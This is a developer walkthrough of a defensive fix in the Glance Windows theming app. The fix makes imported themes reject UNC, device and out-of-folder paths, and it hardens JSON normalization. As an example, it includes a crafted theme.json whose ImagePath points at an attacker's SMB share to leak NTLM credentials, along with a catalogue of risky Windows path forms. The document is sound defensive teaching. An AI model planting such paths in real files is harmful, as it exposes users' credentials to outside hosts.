# Theme input from other people: a walkthrough of the M2 and M3 fixes

This walkthrough is for a mid-level developer who wants to understand how Glance learned to distrust theme files. A theme is a JSON file,
and a `.glance` package is a zip that people send each other, so both are **untrusted input**. The change covers two things:

- **M2:** stop a shared theme from pointing Glance at files outside the theme, and above all at other computers.
- **M3:** make any theme file that parses safe to edit and render. It also gives the editor a crash log.

It assumes you know C# and .NET. You do not need to know the rest of Glance; the parts that matter are explained here. For the big
picture, read `docs/WALKTHROUGH.md`: section 4.4 covers the theme model and section 4.10 the `.glance` package.

**The change:** branch `claude/fix-theme-input-dec5d4`, commit `ad03e38`. It fixes findings M2 and M3 in `docs/reviews/review-full-codebase.md`.
**Files:**
- `src/Glance.Core/Themes/Theme.cs`
- `src/Glance.Core/Themes/ThemePackage.cs`
- `src/Glance.Core/Diagnostics/CrashLog.cs` (new)
- `src/Glance.App/Program.cs`
- `src/Glance.App/MainWindow.cs`
- `src/Glance.Tests/ThemeInputTests.cs` (new, 71 tests)

**Proof (author):** `docs/design/fix-theme-input.md`. **Independent review:** `docs/reviews/review-theme-input.md`.

**Contents**

1. [The problem](#1-the-problem)
2. [Technologies involved](#2-technologies-involved)
3. [High-level walkthrough](#3-high-level-walkthrough)
4. [Detailed code review](#4-detailed-code-review)
5. [Self-review: five ways to improve the change](#5-self-review-five-ways-to-improve-the-change)

---

## 1. The problem

A Glance theme refers to files by path. An image or video widget has `ImagePath`, and a text widget can have `FontFile`. When you save
a theme, Glance copies those files into an `assets\` folder next to `theme.json` and stores relative paths such as `assets/bg.png`.
When you share it, `ThemePackage.Export` zips `theme.json` and `assets/` into a `.glance` file.

Before this change, the importer was careful about the **zip entries**: only `theme.json` and `assets/*`, no `..`, no drive letters,
size caps. It never looked at the **strings inside `theme.json`**. A crafted package could ship this:

```json
{ "Pages": [ { "Widgets": [ { "Kind": "Image", "ImagePath": "\\\\attacker.example\\share\\x.png" } ] } ] }
```

Opening that theme made the editor try to read `\\attacker.example\share\x.png`, and the elevated runner did the same a moment later.
Section 2 explains why merely *trying* to read that path leaks something. A path like `C:\Users\you\Documents\passwords.png` was just as
bad in a quieter way: Save or Export would copy that private file into the theme, and the user would share it with the next export.

M3 is the other half of "untrusted input". `System.Text.Json` happily reads `"Pages": null`, `"SensorId": null`, `"Width": 0`,
`"FontSize": 1e300` or `"Kind": 99` into a C# object whose types say none of that can happen. Each of these crashed something:

- a `NullReferenceException` in `Normalize`
- an `ArgumentNullException` in a dictionary lookup on every frame
- a `decimal` overflow in the property panel
- an infinite scale factor in the display loop

And the editor had no top-level handler, so a crash just closed the window and lost unsaved work.

---

## 2. Technologies involved

### 2.1 Windows path forms

A Windows path is not just "drive, folders, file". The Win32 layer accepts many forms, and several of them do not point at the local disk.

| Form | Example | What it means |
|---|---|---|
| Drive absolute | `C:\Windows\win.ini` | A file on a local (or mapped) drive |
| Drive relative | `C:secret.png` | Relative to the **current directory of drive C:** in this process |
| Rooted | `\Windows\win.ini` | Relative to the **root of the current drive** |
| Relative | `assets/bg.png` | Relative to the process's current directory (or whatever you combine it with) |
| UNC | `\\server\share\x.png` (also `//server/share`) | A file on **another machine**, over SMB |
| Long-path / "verbatim" | `\\?\C:\x`, `\\?\UNC\server\share\x` | Skips normalization; `\\?\UNC\` is UNC in disguise |
| Device namespace | `\\.\PhysicalDrive0`, `\\.\COM1` | A raw device, not a file |
| NT object namespace | `\??\C:\x`, `\\?\GLOBALROOT\Device\...` | The kernel's own names, reachable from Win32 |
| Alternate data stream | `assets\a.png:hidden` | A hidden second stream inside the same file |
| Reserved names | `CON`, `NUL`, `COM1`, `CONIN$` | Historic device names. Older Windows treats them as devices in any folder; Windows 11 mostly only at the top level. |

Two .NET details matter here:

- **`Path.IsPathRooted`** returns true for every form above except plain relative paths. That includes `C:x`, which is *not* fully
  qualified. `Path.IsPathFullyQualified` is the stricter test.
- **`Path.GetFullPath`** applies the Win32 normalization rules: `/` becomes `\`, `.` and `..` are resolved, and trailing dots and spaces
  on the last segment are trimmed. It does **not** touch the disk. That makes it the right tool for "where would this path really go?"

Windows does *not* treat look-alike characters as separators, such as fullwidth `＼` (U+FF3C) or the division slash `∕` (U+2215), and
it does not URL-decode `%5C`. Those end up as odd but local file names.

### 2.2 Why opening a UNC path leaks credentials (NTLM over SMB)

When a Windows program opens `\\host\share\file`, even just to check `File.Exists`, the SMB client connects to `host` and logs on
**as the current user, automatically**. In a workgroup or with a non-Kerberos target this uses NTLM. The server sends a challenge,
and the client answers with a response computed from the user's password hash. The attacker who runs `host` gets:

- the user name and machine name, and
- an NTLMv2 challenge-response, which can be cracked offline if the password is weak, or **relayed** to another server that accepts NTLM.

This is a well-known class of bug: shortcut files, Office documents, PDF readers and media players have all leaked hashes this way. In
Glance it is a little worse, because the runner runs **elevated** and opens the same paths. The file that comes back is also parsed by
Skia (images) or FreeType (fonts), which means attacker-controlled bytes going into native parsers.

Outbound SMB (port 445) is often blocked at the network edge, but not always, and not inside a LAN or VPN. WebDAV can carry the
same logon over HTTP. So the rule in this change is simple: **Glance never opens a network or device path that came from a theme.**

### 2.3 JSON that does not match its C# types

`System.Text.Json` deserializes into your classes, but it does not enforce your nullability annotations or your invariants:

- `"Name": null` sets a `string` property (declared non-nullable) to `null`. Nullable reference types are a compile-time hint only.
- `"Pages": null` replaces the default `new() { ... }` collection with `null`.
- `"Widgets": [ null ]` adds a `null` element.
- With `JsonStringEnumConverter`, `"Kind": 99` is accepted as `(WidgetKind)99`. The converter takes integers as well as names. An unknown
  *name* (`"Kind": "Teleporter"`) does throw `JsonException`.
- Doubles accept any finite number, so `1e300` comes in. NaN and Infinity cannot come from JSON with Glance's options, but they can come
  from code (an importer or a computed layout).

The usual answer is a **normalization pass** right after deserializing, which turns whatever came in into a value the rest of the program
can trust. Glance already had one, `Theme.Normalize`, which only guaranteed "at least one page". This change makes it complete.

### 2.4 Avalonia's dispatcher and unhandled exceptions

In Avalonia, UI events, timers and `async void` continuations run on the UI thread through the **dispatcher**. An exception that escapes
one of them is raised on `Dispatcher.UIThread.UnhandledException`. A handler can set `e.Handled = true` to keep the app running.
Without a handler the exception escapes `StartWithClassicDesktopLifetime` and the process ends. Two other .NET-wide events catch the rest:

- `AppDomain.CurrentDomain.UnhandledException` fires for crashes on any thread. It is too late to stop the process; it is for logging only.
- `TaskScheduler.UnobservedTaskException` fires for a faulted `Task` that nobody awaited.

---

## 3. High-level walkthrough

### 3.1 Two defences for M2

The change puts a check in two places, because a theme reaches Glance in two different ways:

```
 .glance file ──► ThemePackage.Import ──► extract (zip names checked, as before)
                                     └──► Theme.Load ──► RemoveForeignPaths ──► write cleaned theme.json
                                                                   └──► list of removed paths ──► editor dialog

 any theme (opened theme.json, LIVE from the editor, runner reload, Export)
            ──► ThemeRenderer / Export ──► Theme.ResolveAsset ──► null for \\server, //server, \\?\, \\.\, \??\
```

1. **At import, strict:** every `ImagePath` and `FontFile` must be a relative path that resolves inside the package's own `assets\`.
   Anything else is cleared, the cleaned `theme.json` is saved over the extracted one, and the editor shows the user what was removed.
2. **At use, narrower but everywhere:** `ResolveAsset`, the one function the renderer and Export call to turn a widget path into a
   file path, refuses network and device paths whatever their source. Local absolute paths still resolve. The editor needs them for a
   file you just picked and have not saved yet.

### 3.2 One stronger `Normalize` for M3

`Theme.Normalize` runs after every `Theme.Load` and every `ApplySnapshot` (undo, redo, and the runner's `LIVE` preview). It now:

- replaces null collections, and drops null pages and widgets;
- gives every null string the default of a fresh `Widget`;
- maps unknown enum numbers to the default;
- clamps every number to a range wider than anything the editor lets you enter. NaN becomes the default and Infinity the nearest limit.

Because the limits are wider than the editor's, **a theme the editor wrote never changes on load**. Eight real themes are tested
byte for byte.

### 3.3 A crash log for the editor

`Program.Main` now subscribes to the three exception events from 2.4 before Avalonia starts. All three write to
`%AppData%\Glance\editor.log` through a small, never-throwing `CrashLog` in Core. UI-thread exceptions are marked handled, so the
editor keeps running.

### 3.4 What the user sees

Open a shared `.glance` whose `theme.json` points at `\\attacker\share\x.png`:

- The theme opens. The widget shows the grey "no image" box.
- The status bar says "1 file path(s) in the shared theme pointed outside it and were removed; those widgets show nothing."
- A "Shared theme cleaned" window lists each one: `Page 1 / Logo: image "\\attacker\share\x.png" (network or device path)`.

No network connection was made at any point. The old import never opened widget paths, and the cleaned file no longer contains them.

---

## 4. Detailed code review

### 4.1 Recognising network and device paths

```csharp
/// <summary>True for UNC and device paths: two leading slashes in either direction (<c>\\server</c>, <c>//server</c>,
/// <c>\\?\</c>, <c>\\.\</c>) or the NT object prefix <c>\??\</c>.</summary>
public static bool IsNetworkOrDevicePath(string path)
{
    static bool Sep(char c) => c is '\\' or '/';
    var p = path.TrimStart();
    if (p.Length >= 2 && Sep(p[0]) && Sep(p[1])) return true;
    return p.Length >= 4 && Sep(p[0]) && p[1] == '?' && p[2] == '?' && Sep(p[3]);
}
```

The insight is that every dangerous form in the table in 2.1 starts with **two separators**: `\\server`, `//server`, `\/server`,
`\\?\...`, `\\?\UNC\...`, `\\.\...`, `\\?\GLOBALROOT\...`. The one exception is the NT prefix `\??\`. So the function checks only the
first two characters, plus that one prefix, instead of parsing each form. Accepting either slash in either position matters, because
Win32 normalizes `/` to `\` before it decides what kind of path it has.

`TrimStart()` removes leading whitespace (including Unicode spaces) before the check. Windows does not trim leading spaces, so
`" \\server\x"` is really a relative path to a folder named `" "`. Treating it as a network path only *over*-blocks, which is the safe
direction.

### 4.2 `ResolveAsset`: the gate every reader goes through

```csharp
public string? ResolveAsset(string path)
{
    if (string.IsNullOrEmpty(path) || IsNetworkOrDevicePath(path)) return null;
    if (Path.IsPathRooted(path)) return path;
    return BaseFolder is null ? null : Path.Combine(BaseFolder, path);
}
```

Before the change this was the same function without `|| IsNetworkOrDevicePath(path)`. It is called from:

- `ThemeRenderer.DrawImage` (images and videos; the path goes to Skia or to FFmpeg),
- `ThemeRenderer.MakeFont` (font files; the path goes to `SKTypeface.FromFile`),
- `ThemePackage.Export` (`Pack`, which zips the file).

So one line protects the editor preview, the virtual display, the real display (the runner) and Export, whatever the theme's source:
a `.glance`, a hand-copied folder, a `theme.json` on the command line, or the editor's unsaved theme sent to the runner with `LIVE`.

What it deliberately does **not** block: `C:\...` and mapped drives such as `Z:\...`. When you pick a picture with the file dialog, the
widget holds that absolute path until you save, and the preview has to show it. Glance never *writes* a network path itself, because
Save copies every picked file into `assets\`. So refusing network paths only affects themes that someone else made.

One honest gap: `Theme.Save` reads rooted paths **directly**, not through `ResolveAsset`:

```csharp
var source = rooted ? stored : ResolveAsset(stored); // relative paths belong to the old folder
if (source is null || !File.Exists(source)) return stored;
```

So Ctrl+S on a theme that still holds a UNC path opens the share. The review's M1 shows this with a probe, and the design doc lists it as
left open. Section 5 suggests how to close it without breaking "pick a picture from my NAS".

### 4.3 Import: an allow-list, checked on fully resolved paths

```csharp
internal static string? WhyForeign(string path, string destFolder)
{
    if (string.IsNullOrEmpty(path)) return null;
    if (Theme.IsNetworkOrDevicePath(path)) return "network or device path";
    if (Path.IsPathRooted(path)) return "absolute path";
    if (path.Contains(':')) return "drive or stream marker";
    if (path.Split('/', '\\').Any(s => s == "..")) return "contains \"..\"";
    var assets = Path.GetFullPath(Path.Combine(destFolder, "assets")).TrimEnd(Path.DirectorySeparatorChar) + Path.DirectorySeparatorChar;
    var full = Path.GetFullPath(Path.Combine(destFolder, path));
    return full.StartsWith(assets, StringComparison.OrdinalIgnoreCase) ? null : "outside the theme's assets folder";
}
```

Read it from the bottom up. **The last two lines are the real rule**: resolve the path the way Windows would, and keep it only if it
lands inside `<dest>\assets\`. Everything above is a fast, readable early exit that also produces a clear reason for the dialog. Notice:

- **`+ Path.DirectorySeparatorChar`** on `assets`. Without it, `C:\x\assets-evil\a.png` would pass a `StartsWith("C:\x\assets")` test.
  This "prefix plus separator" pattern is the classic fix for that bug, and the zip-entry check a few lines above uses it too.
- **`OrdinalIgnoreCase`**, because Windows paths are case-insensitive.
- **`Contains(':')`** removes drive-relative paths (`C:x`) and alternate data streams (`assets\a.png:hidden`) in one go. A colon is
  never valid in a relative Windows path for any other reason. As a bonus it also catches `file://` and `http://` strings.
- **The `..` check is stricter than needed**: `assets\sub\..\a.png` stays inside `assets\` and would pass the final test, but it is
  refused anyway. Glance's own Export never writes `..`, so a path that has one was hand-made and deserves suspicion.

`RemoveForeignPaths` walks every widget on every page, clears each bad path to `""` and records why:

```csharp
foreach (var page in theme.Pages)
    foreach (var w in page.Widgets)
    {
        if (WhyForeign(w.ImagePath, destFolder) is { } r1) { removed.Add(new(page.Name, w.Name, "Image", w.ImagePath, r1)); w.ImagePath = ""; }
        if (WhyForeign(w.FontFile, destFolder) is { } r2) { removed.Add(new(page.Name, w.Name, "Font file", w.FontFile, r2)); w.FontFile = ""; }
    }
```

Then `Import` writes the cleaned theme back **only when something was removed**:

```csharp
var theme = Theme.Load(themeFile);   // fails early if the JSON is not a valid theme
removed = RemoveForeignPaths(theme, destFolder);
if (removed.Count > 0) File.WriteAllText(themeFile, theme.ToSnapshot(), new UTF8Encoding(false));
```

Writing it back is what makes the cleaning stick. The runner, the next `Load`, Save and Export all read the file, not this in-memory
object. A mutation that removes the write-back fails 28 tests. Skipping the write for clean packages keeps their `theme.json`
byte-identical to what the author shipped, and a test checks exactly that.

Why `File.WriteAllText` and not `theme.Save`? Save copies referenced files into `assets\`. Here every remaining path is already inside
`assets\`, and the whole point is that Save must never see the removed ones.

The old two-argument `Import` is kept as a thin wrapper (`=> Import(package, destFolder, out _)`), so existing callers and tests did not
change.

### 4.4 Telling the user

```csharp
private async Task ShowRemovedImportPathsAsync()
{
    var removed = _importRemoved;
    _importRemoved = Array.Empty<RemovedAssetPath>();
    if (removed.Count == 0) return;
    _status.Text = $"{removed.Count} file path(s) in the shared theme pointed outside it and were removed; those widgets show nothing.";
    await new ReportWindow("Shared theme cleaned", "...", removed.Select(r => r.ToString())).ShowDialog(this);
}
```

`ImportPackage` stores the list in a field, and `ShowRemovedImportPathsAsync` shows it once and clears it. It is called in two places:
after `OpenAsync`, and in the window's `Opened` event, for a `.glance` passed on the command line. A dialog cannot be shown from the
constructor. Every failure path resets the field (`catch { ...; _importRemoved = Array.Empty<RemovedAssetPath>(); }`), so a list from a
failed open can never pop up later for a different theme. The text comes from the untrusted theme (page and widget names), but
`ReportWindow` shows plain text, so there is nothing to inject.

### 4.5 `Normalize`, piece by piece

```csharp
internal void Normalize()
{
    // JSON null is accepted for non-nullable members, so nothing below may assume the file was well formed
    Name ??= "Untitled";
    BackgroundColor ??= "#FF000000";
    Width = Math.Clamp(Width, 1, MaxScreenSide);
    Height = Math.Clamp(Height, 1, MaxScreenSide);
    Pages ??= new();
    for (int i = Pages.Count - 1; i >= 0; i--) if (Pages[i] is null) Pages.RemoveAt(i);
    if (LegacyWidgets is { Count: > 0 } legacy)
    {
        if (Pages.Count == 0) Pages.Add(new ThemePage { Name = "Page 1" });
        Pages[0].Widgets ??= new();
        foreach (var w in legacy) if (w is not null) Pages[0].Widgets.Add(w);
    }
    LegacyWidgets = null;
    if (Pages.Count == 0) Pages.Add(new ThemePage { Name = "Page 1" });
    for (int i = 0; i < Pages.Count; i++) NormalizePage(Pages[i], i);
    ActivePageIndex = Math.Clamp(ActivePageIndex, 0, Pages.Count - 1);
}
```

The order matters:

1. **Repair the containers first** (`Pages ??= new()`, drop nulls), so the loops below cannot throw.
2. **Migrate old files**: themes from before pages existed have a top-level `"Widgets"` list. Note `Pages[0].Widgets ??= new()`: a file
   can have *both* a legacy list and a page with `"Widgets": null`.
3. **Guarantee a page**, then normalize each page and widget.

Removing nulls walks the list **backwards** (`for (int i = Count - 1; ...)`), so `RemoveAt` does not shift the elements still to visit.

`NormalizeWidget` takes its defaults from one static `new Widget()` instead of repeating literals:

```csharp
private static readonly Widget WidgetDefaults = new();
...
w.SensorId ??= d.SensorId;
w.Format ??= d.Format;
w.ImagePath ??= d.ImagePath;
...
w.Text ??= "";   // null means "no text", not the placeholder word
```

That keeps the defaults in one place (the field initializers in `Widget.cs`). `Text` is the deliberate exception: a fresh widget says
"Text" as a placeholder, but a file that says `null` means "nothing". The test `Null_strings_become_their_defaults_and_every_kind_still_renders`
uses reflection over **every** `string` property, so a new string property added later is covered automatically.

Enums:

```csharp
// JsonStringEnumConverter also accepts plain numbers, so "Kind": 99 deserializes
if (!Enum.IsDefined(w.Kind)) w.Kind = d.Kind;
```

`Enum.IsDefined<T>(T)` is the generic, allocation-free overload from .NET 5+. It is only correct because none of these enums is a
`[Flags]` enum. For a flags enum, a combination of valid bits would be "not defined".

Numbers go through one helper:

```csharp
/// <summary>Clamps to [lo, hi]; NaN becomes the default, +/-Infinity the nearest limit.</summary>
private static double Bound(double v, double lo, double hi, double fallback) => double.IsNaN(v) ? fallback : Math.Clamp(v, lo, hi);
```

`Math.Clamp(double.NaN, lo, hi)` returns NaN, because every comparison with NaN is false. That is why NaN needs its own branch.
Infinity compares normally, so it clamps to the nearest limit.

The limits are the interesting design choice:

```csharp
// Limits sit well outside the editor's own ranges (PropertiesPanel), so they only touch values no editor wrote.
const double Far = 100_000, Huge = 1e12;   // Huge: comfortably inside decimal (7.9e28), which the property panel converts to
w.X = Bound(w.X, -Far, Far, d.X);
w.Width = Bound(w.Width, 0, 2 * MaxScreenSide, d.Width);
w.FontSize = Bound(w.FontSize, 1, 1000, d.FontSize);
w.Multiplier = Bound(w.Multiplier, -Huge, Huge, d.Multiplier);
```

Each limit has a reason:

- **The editor's own ranges.** `PropertiesPanel` allows X from -2000 to 4000, font size 4 to 400, multiplier ±1e6, and so on. Every limit
  here is wider, so `Normalize` never rewrites a value the editor could have produced. This is what "JSON compatibility" means in this
  change, and `Valid_themes_load_unchanged` proves it on the starter theme, every template and a theme at the edge of every range.
- **The property panel's `decimal`.** `PropertiesPanel.Num` calls `Convert.ToDecimal(value)`, which throws above about 7.9e28. So `1e300`
  in a file used to crash the editor as soon as you selected the widget. `Huge = 1e12` stays far inside that.
- **Allocation size.** `Theme.Width`/`Height` are capped at 4096. The editor allocates an `SKBitmap` and a `WriteableBitmap` of that size,
  so a file with `"Height": 2147483647` used to ask for gigabytes.

### 4.6 The crash log

```csharp
public static bool Write(string file, string source, Exception? ex, DateTime now)
{
    try
    {
        Directory.CreateDirectory(Path.GetDirectoryName(Path.GetFullPath(file))!);
        var info = new FileInfo(file);
        if (info.Exists && info.Length > MaxBytes) File.Move(file, file + ".old", overwrite: true);
        File.AppendAllText(file, $"{now:yyyy-MM-dd HH:mm:ss}  {source}: {ex?.ToString() ?? "(no exception object)"}{Environment.NewLine}");
        return true;
    }
    catch { return false; }
}
```

Three rules for code that runs inside a crash handler, all followed here:

- **It must never throw.** An exception inside an `UnhandledException` handler is a second crash, and it hides the first.
- **It must not grow without bound.** A bug that throws on every frame would otherwise fill the disk. Rotating to `.old` caps the total
  at about 2 MB.
- **It takes the time as a parameter.** That makes it testable without mocking the clock.

It lives in `Glance.Core`, not in the app, so it can be unit-tested (AGENTS.md: "logic should live in `Glance.Core` where it can be tested").

The wiring in `Program.Main`:

```csharp
Dispatcher.UIThread.UnhandledException += (_, e) =>
{
    CrashLog.Write(CrashLogFile, "Unhandled UI exception (editor kept running)", e.Exception, DateTime.Now);
    e.Handled = true;
};
BuildAvaloniaApp().StartWithClassicDesktopLifetime(args);
```

This subscribes *before* Avalonia's platform is set up. The reviewer checked with a small Avalonia 12.2 console probe that this is safe:
the same `Dispatcher` object is kept, and the Win32 implementation is swapped in during start-up. With the handler, an exception posted to
the dispatcher is logged and the app keeps running. Without it, the same exception ends the app. The trade-off of `Handled = true` is that
the user does not see the failure; section 5 suggests a fix.

### 4.7 The tests

`ThemeInputTests.cs` has four classes:

| Class | Tests | Style |
|---|---|---|
| `ImportedThemePathTests` | 36 | Builds a real `.glance` zip in a temp folder, imports it, reloads `theme.json` **from disk**. A `[MemberData]` list of 14 bad paths runs for both `ImagePath` and `FontFile` (the font case on page 2, so multi-page walking is covered). |
| `ThemeNormalizeTests` | 19 | Writes raw JSON strings (with `null`, `1e300`, `99`) and loads them, then **renders every page** with the fake sensor set. "Does not crash" is part of the assertion. |
| `ThemeInputApiTests` | 13 | The import report, NaN and Infinity through `Normalize` directly, a truth table for `IsNetworkOrDevicePath`. |
| `CrashLogTests` | 3 | Writes, rotates, and never throws (a folder sits where the file should be). |

Two techniques are worth copying:

- **Reflection-driven inputs.** `Props<double>(typeof(Widget))` builds JSON that sets *every* double property to `1e300`, and then checks
  each one is finite and converts to `decimal`. A property added next year is tested without anyone remembering to.
- **Round-trip as the compatibility check.** `Valid_themes_load_unchanged` serializes a theme, loads it back and compares the JSON
  strings. Any accidental clamp or default change shows up as a diff.

The proof rule (show the bug exists, then show it is fixed) was followed. The 55 tests that compile against the old API were run against
`main`: 45 failed, with the expected NullReference, ArgumentNull, decimal-overflow and "path kept" errors. The 10 that passed are the
guards. The reviewer reproduced that run independently.

---

## 5. Self-review: five ways to improve the change

### 1. Close the Save gap without breaking "pick a picture from my NAS"

`ResolveAsset` refuses network paths, but `Save`'s `Adopt` reads rooted paths directly, so Ctrl+S on a hand-made theme still opens
`\\attacker\share`. The tension: a user who picks `\\nas\photos\bg.png` *wants* Save to copy it. The cleanest fix is to tell the two
apart by where the path came from, not by its shape:

```csharp
[JsonIgnore] public HashSet<string> UserPickedPaths { get; } = new(StringComparer.OrdinalIgnoreCase);
...
if (rooted && IsNetworkOrDevicePath(stored) && !UserPickedPaths.Contains(stored)) return stored;
```

An even simpler option: when the file dialog returns a network path, copy the file into `assets\` immediately. Then neither the preview
nor Save ever opens a share, and the "preview stays blank until you save" quirk disappears too.

### 2. Make `ResolveAsset` stricter about "absolute"

`Path.IsPathRooted` is true for `\x.png` and `C:x.png`, which resolve against the process's current directory. That could be a network
folder if Glance was started from one. Use `Path.IsPathFullyQualified` for the "local absolute" branch, and return null for the
half-rooted forms. Glance never writes them anyway. Also decide whether `Path.Combine(BaseFolder, path)` should be re-checked when
`BaseFolder` itself is on a share, and write the decision into the doc comment.

### 3. Fail one path, not the whole import

`WhyForeign` calls `Path.GetFullPath`, which throws on a null character or a 40,000-character path. Then the whole import fails with
"Null character in path." Catch `ArgumentException` and `PathTooLongException` inside `WhyForeign`, return "not a valid path", and let
`RemoveForeignPaths` clear just that widget. Add both inputs to `BadPaths`.

### 4. Make the crash handler visible and self-limiting

`e.Handled = true` keeps unsaved work alive, which is right. But the user never learns that their click failed, and an error that repeats
every frame keeps the editor running half-broken. Add a static `Program.ErrorLogged` event that `MainWindow` turns into a status-bar
message ("Something went wrong; details in editor.log"). Count exceptions in a sliding window, and after, say, 20 in 10 seconds, show
one dialog that offers to save and close.

### 5. Finish the normalization story at the edges

A few inputs still get through `Normalize` unchanged:

- **Duplicate widget ids:** give a repeated id a new GUID in `NormalizePage`.
- **AIDA64 imports:** `AidaImporter.Import` builds a `Theme` with `new`, so it never goes through `Normalize` until the first save and
  reload. Call `theme.Normalize()` at the end of `Import`.
- **Video decode size:** a widget may be 8192 x 8192, and `VideoSource` allocates `width * height * 4` bytes per frame (256 MiB). Cap the
  size passed to FFmpeg at the theme size and let Skia scale.

Each is a few lines plus one test, and together they make the claim "any theme that parses is safe to render" true for every way a
theme can enter Glance.
